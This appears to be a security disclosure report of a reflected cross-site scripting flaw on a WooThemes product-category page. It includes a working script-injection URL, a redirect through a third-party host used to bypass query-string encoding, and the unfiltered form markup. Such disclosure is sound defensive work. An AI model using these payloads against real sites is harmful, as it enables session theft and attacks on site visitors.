Summary:

This XSS vulnerability can be used against IE browsers.
There is an XSS filter in modern IE browsers, so to reproduce we should turn XSS filter off (http://answers.microsoft.com/en-us/ie/forum/ie9-windows_7/how-do-i-turn-off-cross-site-scripting-i-can-no/f3058b73-4956-e011-8dfc-68b599b31bf5?auth=1), or take an old browser without XSS filter (IE7). 
Bypassing an XSS filter in IE will not be covered in this report.

Tested with IE11 with XSS filter disabled and with IE7.
The redirect is used to bypass query string encoding.

1) Visit http://95.213.191.146/r.php?url=http%3A%2F%2Fwww.woothemes.com%2Fproduct-category%2Fwoocommerce-extensions%2F%3F%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
2) It redirects to http://www.woothemes.com/product-category/woocommerce-extensions/?"><script>alert(document.domain)</script>
3) the alert is shown on www.woothemes.com

The vulnerable URL:
http://www.woothemes.com/product-category/woocommerce-extensions/?"><script>alert(document.domain)</script>

The vulnerability occurs because the 'action' attribute is not properly filtered at the page:

    <form class="search" id="productSearchForm" action="/product-category/woocommerce-extensions/?23946\"><script>alert(1)</script>0a7f2=1">

Screenshot is attached.
